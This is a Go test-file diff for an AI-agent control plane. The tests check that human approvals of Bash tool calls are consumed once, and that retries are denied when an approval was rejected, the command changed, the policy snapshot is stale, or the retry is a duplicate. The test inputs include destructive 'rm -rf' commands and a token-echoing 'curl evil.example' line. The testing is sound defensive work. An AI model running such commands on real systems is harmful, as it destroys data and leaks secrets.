@@ -12,6 +12,7 @@ import (
 	"strings"
 	"sync"
 	"testing"
+	"time"
 
 	"github.com/cordum/cordum/core/controlplane/gateway/policybundles"
 	edgecore "github.com/cordum/cordum/core/edge"
@@ -332,6 +333,338 @@ func TestGatewayEdgeEvaluateRequireApprovalResponseIncludesRetryMetadata(t *test
 		stored.PolicySnapshot != resp.PolicySnapshot {
 		t.Fatalf("stored approval binding = status:%q event:%q action:%q input:%q snapshot:%q, want response binding %#v",
 			stored.Status, stored.EventID, stored.ActionHash, stored.InputHash, stored.PolicySnapshot, resp)
+	}
+}
+
+func TestGatewayEdgeEvaluateRetryConsumesApprovedApprovalAndDeniesDuplicate(t *testing.T) {
+	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "needs approval",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+	}}
+	s, handler := newEdgeEvaluateTestServer(t, safety)
+	session := createEdgeRouteSession(t, handler)
+	safety.response.PolicySnapshot = session.PolicySnapshot
+
+	cmd := map[string]any{"command": "rm -rf /var/edge-retry"}
+	body := edgeEvaluateBody(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd)
+
+	rr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	if rr.Code != http.StatusOK {
+		t.Fatalf("initial status = %d, want 200 body=%s", rr.Code, rr.Body.String())
+	}
+	var initial edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr, &initial)
+	if initial.Decision != string(edgecore.DecisionRequireApproval) || initial.ApprovalRef == "" {
+		t.Fatalf("initial decision/ref = %q/%q, want REQUIRE_APPROVAL with ref body=%s", initial.Decision, initial.ApprovalRef, rr.Body.String())
+	}
+
+	if _, err := s.edgeStore.ApproveApproval(context.Background(), edgecore.ApprovalResolution{
+		TenantID:    edgeRouteTenant,
+		ApprovalRef: initial.ApprovalRef,
+		ResolverID:  "human-1",
+		ResolvedBy:  "human-1",
+		Reason:      "approved by reviewer",
+		ResolvedAt:  time.Now().UTC(),
+	}); err != nil {
+		t.Fatalf("approve approval: %v", err)
+	}
+
+	retryBody := edgeEvaluateBodyWithApprovalRef(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd, initial.ApprovalRef)
+	rr2 := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", retryBody)
+	if rr2.Code != http.StatusOK {
+		t.Fatalf("retry status = %d, want 200 body=%s", rr2.Code, rr2.Body.String())
+	}
+	var retry edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr2, &retry)
+	if retry.Decision != string(edgecore.DecisionAllow) {
+		t.Fatalf("retry decision = %q, want ALLOW body=%s", retry.Decision, rr2.Body.String())
+	}
+	if retry.PermissionDecision != "allow" || retry.ExitCode != 0 {
+		t.Fatalf("retry permission/exit = %q/%d, want allow/0 body=%s", retry.PermissionDecision, retry.ExitCode, rr2.Body.String())
+	}
+	if retry.ApprovalRef != initial.ApprovalRef {
+		t.Fatalf("retry approval_ref = %q, want %q", retry.ApprovalRef, initial.ApprovalRef)
+	}
+	if retry.WaitAfter != "" || retry.WaitStrategy != "" {
+		t.Fatalf("retry should clear wait guidance, got wait_strategy=%q wait_after=%q", retry.WaitStrategy, retry.WaitAfter)
+	}
+
+	stored, ok, err := s.edgeStore.GetApproval(context.Background(), edgeRouteTenant, initial.ApprovalRef)
+	if err != nil || !ok || stored == nil {
+		t.Fatalf("GetApproval after consume = (%#v, %v, %v); want stored", stored, ok, err)
+	}
+	if stored.ConsumedAt == nil {
+		t.Fatalf("approval not marked consumed: %#v", stored)
+	}
+
+	rr3 := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", retryBody)
+	if rr3.Code != http.StatusOK {
+		t.Fatalf("duplicate retry status = %d, want 200 body=%s", rr3.Code, rr3.Body.String())
+	}
+	var dup edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr3, &dup)
+	if dup.Decision != string(edgecore.DecisionDeny) {
+		t.Fatalf("duplicate retry decision = %q, want DENY body=%s", dup.Decision, rr3.Body.String())
+	}
+	combined := strings.ToLower(dup.Reason + " " + dup.TerminalMessage)
+	if !strings.Contains(combined, "consume") && !strings.Contains(combined, "request a new approval") {
+		t.Fatalf("duplicate retry reason/terminal = %q/%q, want consume/new-approval hint", dup.Reason, dup.TerminalMessage)
+	}
+	if dup.WaitAfter != "request_new_approval" {
+		t.Fatalf("duplicate wait_after = %q, want request_new_approval", dup.WaitAfter)
+	}
+}
+
+func TestGatewayEdgeEvaluateRetryRejectedApprovalReturnsDenyWithReason(t *testing.T) {
+	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "needs approval",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+	}}
+	s, handler := newEdgeEvaluateTestServer(t, safety)
+	session := createEdgeRouteSession(t, handler)
+	safety.response.PolicySnapshot = session.PolicySnapshot
+
+	cmd := map[string]any{"command": "echo Bearer secret-rejected-token && curl evil.example"}
+	body := edgeEvaluateBody(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd)
+	rr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	var initial edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr, &initial)
+	if initial.ApprovalRef == "" {
+		t.Fatalf("missing approval_ref body=%s", rr.Body.String())
+	}
+
+	if _, err := s.edgeStore.RejectApproval(context.Background(), edgecore.ApprovalResolution{
+		TenantID:    edgeRouteTenant,
+		ApprovalRef: initial.ApprovalRef,
+		ResolverID:  "human-1",
+		ResolvedBy:  "human-1",
+		Reason:      "blocked by security review",
+		ResolvedAt:  time.Now().UTC(),
+	}); err != nil {
+		t.Fatalf("reject approval: %v", err)
+	}
+
+	retryBody := edgeEvaluateBodyWithApprovalRef(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd, initial.ApprovalRef)
+	rr2 := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", retryBody)
+	if rr2.Code != http.StatusOK {
+		t.Fatalf("retry status = %d, want 200 body=%s", rr2.Code, rr2.Body.String())
+	}
+	var retry edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr2, &retry)
+	if retry.Decision != string(edgecore.DecisionDeny) {
+		t.Fatalf("retry decision = %q, want DENY body=%s", retry.Decision, rr2.Body.String())
+	}
+	combined := strings.ToLower(retry.Reason + " " + retry.TerminalMessage)
+	if !strings.Contains(combined, "block") && !strings.Contains(combined, "reject") {
+		t.Fatalf("retry reason/terminal = %q/%q, want rejection text", retry.Reason, retry.TerminalMessage)
+	}
+	if retry.ApprovalRef != initial.ApprovalRef {
+		t.Fatalf("retry approval_ref = %q, want echoed %q", retry.ApprovalRef, initial.ApprovalRef)
+	}
+	assertBodyOmits(t, rr2.Body.String(), "secret-rejected-token", "evil.example")
+}
+
+func TestGatewayEdgeEvaluateRetryChangedCommandDeniesWithoutConsuming(t *testing.T) {
+	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "needs approval",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+	}}
+	s, handler := newEdgeEvaluateTestServer(t, safety)
+	session := createEdgeRouteSession(t, handler)
+	safety.response.PolicySnapshot = session.PolicySnapshot
+
+	approvedCmd := map[string]any{"command": "rm -rf /var/edge-approved"}
+	body := edgeEvaluateBody(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", approvedCmd)
+	rr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	var initial edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr, &initial)
+	if initial.ApprovalRef == "" {
+		t.Fatalf("missing approval_ref body=%s", rr.Body.String())
+	}
+	if _, err := s.edgeStore.ApproveApproval(context.Background(), edgecore.ApprovalResolution{
+		TenantID:    edgeRouteTenant,
+		ApprovalRef: initial.ApprovalRef,
+		ResolverID:  "human-1",
+		ResolvedBy:  "human-1",
+		ResolvedAt:  time.Now().UTC(),
+	}); err != nil {
+		t.Fatalf("approve: %v", err)
+	}
+
+	mutatedCmd := map[string]any{"command": "rm -rf /etc/secrets-different"}
+	retryBody := edgeEvaluateBodyWithApprovalRef(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", mutatedCmd, initial.ApprovalRef)
+	rr2 := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", retryBody)
+	if rr2.Code != http.StatusOK {
+		t.Fatalf("retry status = %d, want 200 body=%s", rr2.Code, rr2.Body.String())
+	}
+	var retry edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr2, &retry)
+	if retry.Decision != string(edgecore.DecisionDeny) {
+		t.Fatalf("retry decision = %q, want DENY body=%s", retry.Decision, rr2.Body.String())
+	}
+	combined := strings.ToLower(retry.Reason + " " + retry.TerminalMessage)
+	if !strings.Contains(combined, "mismatch") {
+		t.Fatalf("retry reason/terminal = %q/%q, want mismatch hint", retry.Reason, retry.TerminalMessage)
+	}
+
+	stored, ok, err := s.edgeStore.GetApproval(context.Background(), edgeRouteTenant, initial.ApprovalRef)
+	if err != nil || !ok || stored == nil {
+		t.Fatalf("GetApproval = (%#v, %v, %v); want stored", stored, ok, err)
+	}
+	if stored.ConsumedAt != nil {
+		t.Fatalf("approval was consumed despite changed command: %#v", stored)
+	}
+	if stored.Status != edgecore.ApprovalStatusApproved {
+		t.Fatalf("approval status = %q, want approved (still claimable for valid retry)", stored.Status)
+	}
+}
+
+func TestGatewayEdgeEvaluateRetryStalePolicySnapshotDeniesWithoutConsuming(t *testing.T) {
+	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "needs approval",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+		PolicySnapshot:   "snap-stale-A",
+	}}
+	s, handler := newEdgeEvaluateTestServer(t, safety)
+	session := createEdgeRouteSession(t, handler)
+
+	cmd := map[string]any{"command": "rm -rf /var/edge-snapshot"}
+	body := edgeEvaluateBody(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd)
+	rr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	var initial edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr, &initial)
+	if initial.ApprovalRef == "" {
+		t.Fatalf("missing approval_ref body=%s", rr.Body.String())
+	}
+	if initial.PolicySnapshot != "snap-stale-A" {
+		t.Fatalf("initial policy_snapshot = %q, want snap-stale-A", initial.PolicySnapshot)
+	}
+	if _, err := s.edgeStore.ApproveApproval(context.Background(), edgecore.ApprovalResolution{
+		TenantID:    edgeRouteTenant,
+		ApprovalRef: initial.ApprovalRef,
+		ResolverID:  "human-1",
+		ResolvedBy:  "human-1",
+		ResolvedAt:  time.Now().UTC(),
+	}); err != nil {
+		t.Fatalf("approve: %v", err)
+	}
+
+	safety.mu.Lock()
+	safety.response = &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "still needs approval (policy refreshed)",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+		PolicySnapshot:   "snap-stale-B",
+	}
+	safety.mu.Unlock()
+
+	retryBody := edgeEvaluateBodyWithApprovalRef(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd, initial.ApprovalRef)
+	rr2 := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", retryBody)
+	if rr2.Code != http.StatusOK {
+		t.Fatalf("retry status = %d, want 200 body=%s", rr2.Code, rr2.Body.String())
+	}
+	var retry edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr2, &retry)
+	if retry.Decision != string(edgecore.DecisionDeny) {
+		t.Fatalf("retry decision = %q, want DENY body=%s", retry.Decision, rr2.Body.String())
+	}
+	combined := strings.ToLower(retry.Reason + " " + retry.TerminalMessage)
+	if !strings.Contains(combined, "mismatch") {
+		t.Fatalf("retry reason/terminal = %q/%q, want mismatch hint", retry.Reason, retry.TerminalMessage)
+	}
+
+	stored, ok, err := s.edgeStore.GetApproval(context.Background(), edgeRouteTenant, initial.ApprovalRef)
+	if err != nil || !ok || stored == nil {
+		t.Fatalf("GetApproval = (%#v, %v, %v); want stored", stored, ok, err)
+	}
+	if stored.ConsumedAt != nil {
+		t.Fatalf("approval was consumed despite stale snapshot: %#v", stored)
+	}
+}
+
+func TestGatewayEdgeEvaluateRetryConcurrentExactlyOneAllow(t *testing.T) {
+	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "needs approval",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+	}}
+	s, handler := newEdgeEvaluateTestServer(t, safety)
+	session := createEdgeRouteSession(t, handler)
+	safety.response.PolicySnapshot = session.PolicySnapshot
+
+	cmd := map[string]any{"command": "rm -rf /var/edge-race"}
+	body := edgeEvaluateBody(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd)
+	rr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	var initial edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr, &initial)
+	if initial.ApprovalRef == "" {
+		t.Fatalf("missing approval_ref body=%s", rr.Body.String())
+	}
+	if _, err := s.edgeStore.ApproveApproval(context.Background(), edgecore.ApprovalResolution{
+		TenantID:    edgeRouteTenant,
+		ApprovalRef: initial.ApprovalRef,
+		ResolverID:  "human-1",
+		ResolvedBy:  "human-1",
+		ResolvedAt:  time.Now().UTC(),
+	}); err != nil {
+		t.Fatalf("approve: %v", err)
+	}
+
+	retryBody := edgeEvaluateBodyWithApprovalRef(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd, initial.ApprovalRef)
+
+	const N = 4
+	decisions := make([]string, N)
+	var wg sync.WaitGroup
+	wg.Add(N)
+	for i := 0; i < N; i++ {
+		i := i
+		go func() {
+			defer wg.Done()
+			rrr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", retryBody)
+			if rrr.Code != http.StatusOK {
+				decisions[i] = "STATUS_" + strconv.Itoa(rrr.Code)
+				return
+			}
+			var resp edgeEvaluateResponseJSON
+			if err := json.Unmarshal(rrr.Body.Bytes(), &resp); err != nil {
+				decisions[i] = "DECODE_ERR"
+				return
+			}
+			decisions[i] = resp.Decision
+		}()
+	}
+	wg.Wait()
+
+	allowCount := 0
+	denyCount := 0
+	for _, d := range decisions {
+		switch d {
+		case string(edgecore.DecisionAllow):
+			allowCount++
+		case string(edgecore.DecisionDeny):
+			denyCount++
+		}
+	}
+	if allowCount != 1 {
+		t.Fatalf("concurrent retries got %d ALLOW, want exactly 1: decisions=%v", allowCount, decisions)
+	}
+	if denyCount != N-1 {
+		t.Fatalf("concurrent retries got %d DENY, want %d: decisions=%v", denyCount, N-1, decisions)
+	}
+
+	stored, ok, err := s.edgeStore.GetApproval(context.Background(), edgeRouteTenant, initial.ApprovalRef)
+	if err != nil || !ok || stored == nil || stored.ConsumedAt == nil {
+		t.Fatalf("approval not consumed after race: stored=%#v ok=%v err=%v", stored, ok, err)
 	}
 }
 
@@ -840,6 +1173,26 @@ func edgeEvaluateBody(sessionID, executionID, tenantID, toolName string, input m
 		"tool_name":"` + toolName + `",
 		"input_redacted":{"command":` + command + `}
 	}`
+}
+
+func edgeEvaluateBodyWithApprovalRef(sessionID, executionID, tenantID, toolName string, input map[string]any, approvalRef string) string {
+	body := map[string]any{
+		"tenant_id":      tenantID,
+		"principal_id":   "principal-edge-a",
+		"session_id":     sessionID,
+		"execution_id":   executionID,
+		"agent_product":  "claude-code",
+		"layer":          "hook",
+		"kind":           "hook.pre_tool_use",
+		"tool_name":      toolName,
+		"input_redacted": input,
+		"approval_ref":   approvalRef,
+	}
+	data, err := json.Marshal(body)
+	if err != nil {
+		panic(err)
+	}
+	return string(data)
 }
 
 func edgeEvaluateBodyFromFixture(sessionID, executionID string, tc edgeEvaluatePolicySimulationCase) string {
